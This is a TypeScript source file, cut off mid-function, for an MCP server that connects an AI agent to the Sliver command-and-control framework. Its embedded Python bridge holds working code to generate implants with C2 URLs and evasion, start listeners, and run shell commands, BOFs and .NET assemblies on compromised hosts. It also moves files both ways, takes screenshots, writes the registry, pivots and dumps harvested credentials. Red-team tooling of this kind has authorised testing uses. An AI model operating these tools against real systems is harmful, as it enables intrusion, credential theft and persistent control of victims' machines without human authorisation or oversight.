#!/usr/bin/env node
/**
 * Sliver C2 MCP Server
 *
 * A Model Context Protocol server for interacting with Sliver C2 framework.
 * Provides tools for managing implants, sessions, beacons, listeners, and more.
 *
 * Uses sliver-py Python library via subprocess for reliable gRPC communication.
 */

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
  TextContent,
} from "@modelcontextprotocol/sdk/types.js";
import { spawn, execSync } from "child_process";
import { existsSync } from "fs";

// Configuration
interface SliverConfig {
  operatorConfigPath: string;
  pythonPath: string;
  timeout: number;
}

let config: SliverConfig = {
  operatorConfigPath: process.env.SLIVER_OPERATOR_CONFIG || "",
  pythonPath: process.env.PYTHON_PATH || "python3",
  timeout: parseInt(process.env.SLIVER_TIMEOUT || "30000"),
};

// Parse command line arguments
const args = process.argv.slice(2);
for (let i = 0; i < args.length; i++) {
  if (args[i] === "--operator-config" && args[i + 1]) {
    config.operatorConfigPath = args[i + 1];
    i++;
  } else if (args[i] === "--python" && args[i + 1]) {
    config.pythonPath = args[i + 1];
    i++;
  } else if (args[i] === "--timeout" && args[i + 1]) {
    config.timeout = parseInt(args[i + 1]);
    i++;
  }
}

/**
 * Execute a Sliver command via Python bridge
 */
async function executeSliverCommand(
  command: string,
  params: Record<string, unknown> = {}
): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const pythonScript = `
import sys
import json
import asyncio

async def main():
    try:
        from sliver import SliverClientConfig, SliverClient

        config_path = ${JSON.stringify(config.operatorConfigPath)}
        if not config_path:
            print(json.dumps({"error": "No operator config file specified. Use --operator-config flag or SLIVER_OPERATOR_CONFIG env var"}))
            return

        config = SliverClientConfig.parse_config_file(config_path)
        client = SliverClient(config)
        await client.connect()

        command = ${JSON.stringify(command)}
        params = ${JSON.stringify(params)}

        result = await execute_command(client, command, params)
        print(json.dumps({"success": True, "data": result}))

    except ImportError as e:
        print(json.dumps({"error": f"sliver-py not installed: {str(e)}. Install with: pip install sliver-py"}))
    except FileNotFoundError as e:
        print(json.dumps({"error": f"Operator config file not found: {str(e)}"}))
    except Exception as e:
        print(json.dumps({"error": str(e)}))

async def execute_command(client, command, params):
    # Server info commands
    if command == "version":
        version = await client.version()
        return {"major": version.Major, "minor": version.Minor, "patch": version.Patch}

    elif command == "operators":
        operators = await client.operators()
        return [{"name": op.Name, "online": op.Online} for op in operators]

    # Session commands
    elif command == "sessions":
        sessions = await client.sessions()
        return [{
            "id": s.ID,
            "name": s.Name,
            "hostname": s.Hostname,
            "username": s.Username,
            "os": s.OS,
            "arch": s.Arch,
            "transport": s.Transport,
            "remote_address": s.RemoteAddress,
            "pid": s.PID,
            "filename": s.Filename,
            "active_c2": s.ActiveC2,
            "is_dead": s.IsDead
        } for s in sessions]

    elif command == "interact_session":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        interact = await client.interact_session(session_id)
        return {"success": True, "session_id": session_id}

    elif command == "kill_session":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        await client.kill_session(session_id)
        return {"success": True}

    # Beacon commands
    elif command == "beacons":
        import time as _time
        beacons = await client.beacons()
        now = int(_time.time())
        result = []
        for b in beacons:
            nc = b.NextCheckin
            if hasattr(nc, 'seconds'):
                nc_ts = nc.seconds
            elif hasattr(nc, 'timestamp'):
                nc_ts = int(nc.timestamp())
            else:
                nc_ts = int(nc) if nc else 0
            is_alive = nc_ts > now
            overdue_sec = max(0, now - nc_ts) if not is_alive else 0
            interval_sec = int(b.Interval) // 1_000_000_000 if b.Interval else 60
            result.append({
                "id": b.ID,
                "name": b.Name,
                "hostname": b.Hostname,
                "username": b.Username,
                "os": b.OS,
                "arch": b.Arch,
                "transport": b.Transport,
                "remote_address": b.RemoteAddress,
                "pid": b.PID,
                "interval_sec": interval_sec,
                "next_checkin_ts": nc_ts,
                "status": "ALIVE" if is_alive else "DEAD",
                "overdue_seconds": overdue_sec,
                "task_count": len(b.Tasks) if hasattr(b, 'Tasks') and b.Tasks else 0
            })
        return result

    elif command == "interact_beacon":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        interact = await client.interact_beacon(beacon_id)
        return {"success": True, "beacon_id": beacon_id}

    # Listener commands
    elif command == "jobs":
        jobs = await client.jobs()
        return [{
            "id": j.ID,
            "name": j.Name,
            "description": j.Description,
            "protocol": j.Protocol,
            "port": j.Port
        } for j in jobs]

    elif command == "start_mtls_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 8888)
        job = await client.start_mtls_listener(host, port)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_https_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 443)
        domain = params.get("domain", "")
        job = await client.start_https_listener(host, port, domain=domain)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_http_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 80)
        domain = params.get("domain", "")
        job = await client.start_http_listener(host, port, domain=domain)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_dns_listener":
        domains = params.get("domains", [])
        job = await client.start_dns_listener(domains)
        return {"id": job.ID, "name": job.Name}

    elif command == "start_wg_listener":
        port = params.get("port", 53)
        job = await client.start_wg_listener(port)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "kill_job":
        job_id = params.get("job_id")
        if not job_id:
            return {"error": "job_id required"}
        await client.kill_job(job_id)
        return {"success": True}

    # Implant generation commands
    elif command == "implant_builds":
        builds = await client.implant_builds()
        result = {}
        for name, build in builds.items():
            result[name] = {
                "id": build.ID,
                "name": build.Name,
                "os": build.GOOS,
                "arch": build.GOARCH,
                "format": str(build.Format),
                "is_beacon": build.IsBeacon
            }
        return result

    elif command == "generate":
        # Generate implant with specified options
        os_target = params.get("os", "linux")
        arch = params.get("arch", "amd64")
        format_type = params.get("format", "EXECUTABLE")
        c2_urls = params.get("c2", [])
        is_beacon = params.get("is_beacon", False)
        name = params.get("name", "")

        # This is a simplified version - actual generation requires more params
        return {"error": "Direct implant generation requires more complex setup. Use Sliver console for now."}

    elif command == "implant_profiles":
        profiles = await client.implant_profiles()
        return [{
            "name": p.Name,
            "config": {
                "os": p.Config.GOOS if p.Config else None,
                "arch": p.Config.GOARCH if p.Config else None,
                "is_beacon": p.Config.IsBeacon if p.Config else None
            }
        } for p in profiles]

    # Session interaction commands (require active session)
    elif command == "session_ls":
        session_id = params.get("session_id")
        path = params.get("path", ".")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ls_result = await interact.ls(path)
        return {
            "path": ls_result.Path,
            "exists": ls_result.Exists,
            "files": [{
                "name": f.Name,
                "is_dir": f.IsDir,
                "size": f.Size,
                "mode": str(f.Mode)
            } for f in ls_result.Files]
        }

    elif command == "session_pwd":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pwd_result = await interact.pwd()
        return {"path": pwd_result.Path}

    elif command == "session_cd":
        session_id = params.get("session_id")
        path = params.get("path")
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.cd(path)
        pwd_result = await interact.pwd()
        return {"path": pwd_result.Path}

    elif command == "session_mkdir":
        session_id = params.get("session_id")
        path = params.get("path")
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.mkdir(path)
        return {"success": True, "path": path}

    elif command == "session_rm":
        session_id = params.get("session_id")
        path = params.get("path")
        recursive = params.get("recursive", False)
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.rm(path, recursive=recursive)
        return {"success": True}

    elif command == "session_download":
        session_id = params.get("session_id")
        remote_path = params.get("remote_path")
        local_path = params.get("local_path", "")
        if not session_id or not remote_path:
            return {"error": "session_id and remote_path required"}

        interact = await client.interact_session(session_id)
        download = await interact.download(remote_path)
        size = len(download.Data) if download.Data else 0
        if local_path and download.Data:
            import os as _os
            _os.makedirs(_os.path.dirname(_os.path.abspath(local_path)), exist_ok=True)
            with open(local_path, 'wb') as _f:
                _f.write(download.Data)
        return {
            "path": download.Path,
            "size": size,
            "exists": download.Exists,
            "is_dir": download.IsDir,
            "saved_to": local_path if local_path and download.Data else None
        }

    elif command == "session_upload":
        session_id = params.get("session_id")
        local_path = params.get("local_path")
        remote_path = params.get("remote_path")
        if not session_id or not local_path or not remote_path:
            return {"error": "session_id, local_path, and remote_path required"}

        interact = await client.interact_session(session_id)
        with open(local_path, 'rb') as f:
            data = f.read()
        upload = await interact.upload(remote_path, data)
        return {"path": upload.Path, "success": True}

    elif command == "session_execute":
        session_id = params.get("session_id")
        exe = params.get("exe")
        args = params.get("args", [])
        output = params.get("output", True)
        if not session_id or not exe:
            return {"error": "session_id and exe required"}

        interact = await client.interact_session(session_id)
        result = await interact.execute(exe, args, output)
        return {
            "status": result.Status,
            "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
            "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
            "pid": result.Pid
        }

    elif command == "session_shell":
        session_id = params.get("session_id")
        command_str = params.get("command")
        if not session_id or not command_str:
            return {"error": "session_id and command required"}

        interact = await client.interact_session(session_id)
        # Use execute with shell
        if interact.os.lower() == "windows":
            result = await interact.execute("cmd.exe", ["/c", command_str], True)
        else:
            result = await interact.execute("/bin/sh", ["-c", command_str], True)
        return {
            "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
            "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
            "status": result.Status
        }

    elif command == "session_ps":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ps_result = await interact.ps()
        return [{
            "pid": p.Pid,
            "ppid": p.Ppid,
            "executable": p.Executable,
            "owner": p.Owner,
            "architecture": p.Architecture
        } for p in ps_result.Processes[:50]]  # Limit to 50

    elif command == "session_ifconfig":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ifconfig = await interact.ifconfig()
        return [{
            "index": iface.Index,
            "name": iface.Name,
            "mac": iface.MAC,
            "addresses": [{"ip": addr.Ip, "mask": addr.Mask} for addr in iface.IPAddresses]
        } for iface in ifconfig.NetInterfaces]

    elif command == "session_netstat":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        netstat = await interact.netstat()
        return [{
            "local_addr": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port},
            "remote_addr": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None,
            "protocol": e.Protocol,
            "state": e.SkState,
            "pid": e.Pid,
            "process": e.Process
        } for e in netstat.Entries[:50]]  # Limit to 50

    elif command == "session_screenshot":
        session_id = params.get("session_id")
        save_path = params.get("save_path", "/tmp/session_screenshot.png")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        screenshot = await interact.screenshot()
        if screenshot.Data:
            with open(save_path, 'wb') as _f:
                _f.write(screenshot.Data)
        return {
            "success": True,
            "save_path": save_path,
            "size": len(screenshot.Data) if screenshot.Data else 0
        }

    elif command == "beacon_execute_bof":
        import time as _time, base64 as _b64
        beacon_id = params.get("beacon_id")
        bof_path = params.get("bof_path")
        bof_args_b64 = params.get("args", [])
        timeout_secs = int(params.get("timeout", 120))
        save_path = params.get("save_path", "")

        if not beacon_id or not bof_path:
            return {"error": "beacon_id and bof_path required"}

        with open(bof_path, 'rb') as _f:
            bof_data = _f.read()

        bof_args = [_b64.b64decode(a) for a in bof_args_b64] if bof_args_b64 else []

        interact = await client.interact_beacon(beacon_id)
        task = await interact.execute_bof(bof_data, bof_args)
        task_id = task.ID

        # Poll for task completion
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and hasattr(task_content, 'Response') and task_content.Response:
                    data = task_content.Response
                    if save_path:
                        with open(save_path, 'wb') as _f:
                            _f.write(data)
                        return {
                            "success": True,
                            "task_id": task_id,
                            "save_path": save_path,
                            "size": len(data)
                        }
                    else:
                        return {
                            "success": True,
                            "task_id": task_id,
                            "output": data.decode('utf-8', errors='replace'),
                            "size": len(data)
                        }
            except Exception as _e:
                pass

        return {
            "error": f"Timeout ({timeout_secs}s) — beacon belum eksekusi BOF",
            "task_id": task_id
        }

    elif command == "beacon_open_session":
        import time as _time
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))

        if not beacon_id:
            return {"error": "beacon_id required"}

        # Get sessions before, so we can detect new session after open
        sessions_before = await client.sessions()
        session_ids_before = {s.ID for s in sessions_before}

        # Queue OpenSession task on beacon via gRPC stub
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2
        from sliver.pb.commonpb import common_pb2 as _common_pb2
        msg = _sliver_pb2.OpenSession(
            Request=_common_pb2.Request(BeaconID=beacon_id)
        )
        await client._stub.OpenSession(msg, metadata=client._metadata)

        # Poll for new session to appear (beacon must check in to execute)
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            sessions_now = await client.sessions()
            for s in sessions_now:
                if s.ID not in session_ids_before:
                    return {
                        "success": True,
                        "session_id": s.ID,
                        "name": s.Name,
                        "hostname": s.Hostname,
                        "username": s.Username
                    }

        return {
            "error": f"Timeout ({timeout_secs}s) — beacon belum buka session",
            "hint": "Beacon perlu check-in. Cek interval beacon dan coba lagi."
        }

    elif command == "beacon_rm":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        await client.kill_beacon(beacon_id)
        return {"success": True, "beacon_id": beacon_id}

    elif command == "beacon_execute":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2
        beacon_id = params.get("beacon_id")
        exe = params.get("exe")
        args_exec = params.get("args", [])
        output = params.get("output", True)
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not exe:
            return {"error": "beacon_id and exe required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.execute(exe, args_exec, output)
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and task_content.Response:
                    exec_resp = _sliver_pb2.Execute()
                    exec_resp.ParseFromString(task_content.Response)
                    return {
                        "success": True,
                        "task_id": task_id,
                        "status": exec_resp.Status,
                        "stdout": exec_resp.Stdout.decode('utf-8', errors='replace') if exec_resp.Stdout else "",
                        "stderr": exec_resp.Stderr.decode('utf-8', errors='replace') if exec_resp.Stderr else "",
                        "pid": exec_resp.Pid
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum eksekusi", "task_id": task_id}

    elif command == "beacon_upload":
        import time as _time
        beacon_id = params.get("beacon_id")
        local_path = params.get("local_path")
        remote_path = params.get("remote_path")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not local_path or not remote_path:
            return {"error": "beacon_id, local_path, and remote_path required"}

        with open(local_path, 'rb') as _f:
            data = _f.read()

        interact = await client.interact_beacon(beacon_id)
        task = await interact.upload(remote_path, data)
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and task_content.Response:
                    return {"success": True, "task_id": task_id, "remote_path": remote_path, "size": len(data)}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum upload", "task_id": task_id}

    elif command == "beacon_screenshot":
        import time as _time
        beacon_id = params.get("beacon_id")
        save_path = params.get("save_path", "/tmp/beacon_screenshot.png")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.screenshot()
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and task_content.Response:
                    from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2b
                    ss = _sliver_pb2b.Screenshot()
                    ss.ParseFromString(task_content.Response)
                    if ss.Data:
                        with open(save_path, 'wb') as _f:
                            _f.write(ss.Data)
                        return {"success": True, "task_id": task_id, "save_path": save_path, "size": len(ss.Data)}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum screenshot", "task_id": task_id}

    elif command == "beacon_download":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2d
        beacon_id = params.get("beacon_id")
        remote_path = params.get("remote_path")
        local_path = params.get("local_path", "")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not remote_path:
            return {"error": "beacon_id and remote_path required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.download(remote_path)
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    dl = _sliver_pb2d.Download()
                    dl.ParseFromString(tc.Response)
                    size = len(dl.Data) if dl.Data else 0
                    if local_path and dl.Data:
                        import os as _os
                        _os.makedirs(_os.path.dirname(_os.path.abspath(local_path)), exist_ok=True)
                        with open(local_path, 'wb') as _f:
                            _f.write(dl.Data)
                    return {
                        "success": True, "task_id": task_id,
                        "path": dl.Path, "size": size,
                        "exists": dl.Exists, "is_dir": dl.IsDir,
                        "saved_to": local_path if local_path and dl.Data else None
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum download", "task_id": task_id}

    elif command == "beacon_ls":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2ls
        beacon_id = params.get("beacon_id")
        path = params.get("path", ".")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.ls(path)
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ls_r = _sliver_pb2ls.Ls()
                    ls_r.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "path": ls_r.Path, "exists": ls_r.Exists,
                        "files": [{"name": f.Name, "is_dir": f.IsDir, "size": f.Size, "mode": str(f.Mode)} for f in ls_r.Files]
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_ps":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2ps
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.ps()
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ps_r = _sliver_pb2ps.Ps()
                    ps_r.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "processes": [{"pid": p.Pid, "ppid": p.Ppid, "exe": p.Executable, "owner": p.Owner, "arch": p.Architecture} for p in ps_r.Processes[:100]]
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_ifconfig":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2if
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.ifconfig()
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ic = _sliver_pb2if.Ifconfig()
                    ic.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "interfaces": [{"index": i.Index, "name": i.Name, "mac": i.MAC, "addresses": [{"ip": a.Ip, "mask": a.Mask} for a in i.IPAddresses]} for i in ic.NetInterfaces]
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_registry_read":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2reg
        beacon_id = params.get("beacon_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not reg_path or not key:
            return {"error": "beacon_id, path, and key required"}

        interact = await client.interact_beacon(beacon_id)
        task = await interact.registry_read(hive, reg_path, key, "")
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    rr = _sliver_pb2reg.RegistryRead()
                    rr.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "value": rr.Value}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_registry_write":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2rw
        beacon_id = params.get("beacon_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        string_value = params.get("string_value", "")
        dword_value = int(params.get("dword_value", 0))
        reg_type = params.get("reg_type", "REG_SZ")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not reg_path or not key:
            return {"error": "beacon_id, path, and key required"}

        type_map = {"REG_SZ": 1, "REG_EXPAND_SZ": 2, "REG_BINARY": 3, "REG_DWORD": 4, "REG_QWORD": 11}
        reg_type_int = type_map.get(reg_type, 1)

        interact = await client.interact_beacon(beacon_id)
        task = await interact.registry_write(hive, reg_path, key, "", string_value, b"", dword_value, 0, reg_type_int)
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    return {"success": True, "task_id": task_id, "hive": hive, "path": reg_path, "key": key}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "session_registry_read":
        session_id = params.get("session_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        if not session_id or not reg_path or not key:
            return {"error": "session_id, path, and key required"}

        interact = await client.interact_session(session_id)
        rr = await interact.registry_read(hive, reg_path, key, "")
        return {"value": rr.Value}

    elif command == "session_registry_write":
        session_id = params.get("session_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        string_value = params.get("string_value", "")
        dword_value = int(params.get("dword_value", 0))
        reg_type = params.get("reg_type", "REG_SZ")
        if not session_id or not reg_path or not key:
            return {"error": "session_id, path, and key required"}

        type_map = {"REG_SZ": 1, "REG_EXPAND_SZ": 2, "REG_BINARY": 3, "REG_DWORD": 4, "REG_QWORD": 11}
        reg_type_int = type_map.get(reg_type, 1)

        interact = await client.interact_session(session_id)
        await interact.registry_write(hive, reg_path, key, "", string_value, b"", dword_value, 0, reg_type_int)
        return {"success": True, "hive": hive, "path": reg_path, "key": key}

    elif command == "beacon_execute_assembly":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2asm
        beacon_id = params.get("beacon_id")
        assembly_path = params.get("assembly_path")
        arguments = params.get("arguments", "")
        process = params.get("process", "notepad.exe")
        is_dll = params.get("is_dll", False)
        arch = params.get("arch", "x86_64")
        class_name = params.get("class_name", "")
        method = params.get("method", "Main")
        app_domain = params.get("app_domain", "")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not assembly_path:
            return {"error": "beacon_id and assembly_path required"}

        with open(assembly_path, 'rb') as _f:
            assembly_data = _f.read()

        interact = await client.interact_beacon(beacon_id)
        task = await interact.execute_assembly(assembly_data, arguments, process, is_dll, arch, class_name, method, app_domain)
        task_id = task.ID

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ea = _sliver_pb2asm.ExecuteAssembly()
                    ea.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "output": ea.Output.decode('utf-8', errors='replace') if ea.Output else ""
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "session_execute_assembly":
        session_id = params.get("session_id")
        assembly_path = params.get("assembly_path")
        arguments = params.get("arguments", "")
        process = params.get("process", "notepad.exe")
        is_dll = params.get("is_dll", False)
        arch = params.get("arch", "x86_64")
        class_name = params.get("class_name", "")
        method = params.get("method", "Main")
        app_domain = params.get("app_domain", "")
        if not session_id or not assembly_path:
            return {"error": "session_id and assembly_path required"}

        with open(assembly_path, 'rb') as _f:
            assembly_data = _f.read()

        interact = await client.interact_session(session_id)
        ea = await interact.execute_assembly(assembly_data, arguments, process, is_dll, arch, class_name, method, app_domain)
        return {"success": True, "output": ea.Output.decode('utf-8', errors='replace') if ea.Output else ""}

    elif command == "rename_beacon":
        beacon_id = params.get("beacon_id")
        name = params.get("name")
        if not beacon_id or not name:
            return {"error": "beacon_id and name required"}
        await client.rename_beacon(beacon_id, name)
        return {"success": True, "beacon_id": beacon_id, "name": name}

    elif command == "beacon_tasks":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        tasks = await client.beacon_tasks(beacon_id)
        return [{
            "id": t.ID, "beacon_id": t.BeaconID,
            "created_at": t.CreatedAt,
            "state": t.State,
            "description": t.Description
        } for t in tasks]

    elif command == "prune_beacons":
        import time as _time
        beacons = await client.beacons()
        now = int(_time.time())
        pruned = []
        for b in beacons:
            nc = b.NextCheckin
            if hasattr(nc, 'seconds'):
                nc_ts = nc.seconds
            elif hasattr(nc, 'timestamp'):
                nc_ts = int(nc.timestamp())
            else:
                nc_ts = int(nc) if nc else 0
            if nc_ts < now:
                await client.kill_beacon(b.ID)
                pruned.append({"id": b.ID, "name": b.Name, "hostname": b.Hostname})
        return {"pruned": pruned, "count": len(pruned)}

    elif command == "generate_implant":
        import os as _os
        from sliver.pb.clientpb import client_pb2 as _client_pb2gen
        is_beacon = params.get("is_beacon", True)
        goos = params.get("goos", "windows")
        goarch = params.get("goarch", "amd64")
        c2_urls = params.get("c2", [])
        format_str = params.get("format", "EXECUTABLE")
        name = params.get("name", "")
        save_path = params.get("save_path")
        beacon_interval = int(params.get("beacon_interval", 60))
        beacon_jitter = int(params.get("beacon_jitter", 30))
        evasion = params.get("evasion", False)

        if not c2_urls or not save_path:
            return {"error": "c2 (list of URLs) and save_path required"}

        format_map = {"EXECUTABLE": 0, "SHARED_LIB": 1, "SHELLCODE": 2, "SERVICE": 3}
        fmt = format_map.get(format_str.upper(), 0)

        cfg = _client_pb2gen.ImplantConfig(
            IsBeacon=is_beacon,
            GOOS=goos,
            GOARCH=goarch,
            Format=fmt,
            Name=name,
            Evasion=evasion,
            BeaconInterval=int(beacon_interval * 1_000_000_000),
            BeaconJitter=int(beacon_jitter * 1_000_000_000),
            C2=[_client_pb2gen.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)],
        )

        gen = await client.generate_implant(cfg, timeout=600)
        _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
        with open(save_path, 'wb') as _f:
            _f.write(gen.File.Data)

        return {
            "success": True,
            "save_path": save_path,
            "size": len(gen.File.Data),
            "name": gen.File.Name,
            "goos": goos, "goarch": goarch,
            "is_beacon": is_beacon, "format": format_str
        }

    # Pivot commands
    elif command == "pivot_listeners":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pivots = await interact.list_pivots()
        return [{
            "id": p.ID,
            "type": str(p.Type),
            "bind_address": p.BindAddress
        } for p in pivots]

    elif command == "pivot_start_tcp":
        session_id = params.get("session_id")
        port = params.get("port", 9898)
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pivot = await interact.start_tcp_pivot(port)
        return {
            "id": pivot.ID,
            "bind_address": pivot.BindAddress,
            "type": "TCP"
        }

    # Credentials
    elif command == "creds":
        creds = await client.creds()
        return [{
            "id": c.ID,
            "username": c.Username,
            "plaintext": c.Plaintext,
            "hash": c.Hash,
            "hash_type": str(c.HashType),
            "hostname": c.Hostname,
            "origin": str(c.Origin.Type) if c.Origin else None
        } for c in creds.Credentials]

    # Hosts
    elif command == "hosts":
        hosts = await client.hosts()
        return [{
            "id": h.HostUUID,
            "hostname": h.Hostname,
            "os": h.OSVersion,
            "ioc_count": len(h.IOCs) if h.IOCs else 0
        } for h in hosts.Hosts]

    else:
        return {"error": f"Unknown command: {command}"}

asyncio.run(main())
`;

    const python = spawn(config.pythonPath, ["-c", pythonScript], {
      timeout: config.timeout,
    });

    let stdout = "";
    let stderr = "";

    python.stdout.on("data", (data: Buffer) => {
      stdout += data.toString();
    });

    python.stderr.on("data", (data: Buffer) => {
      stderr += data.toString();
    });

    python.on("close", (code: number | null) => {
      if (code !== 0 && !stdout) {
        reject(new Error(`Python process exited with code ${code}: ${stderr}`));
        return;
      }

      try {
        // Find the JSON in stdout (may have extra output)
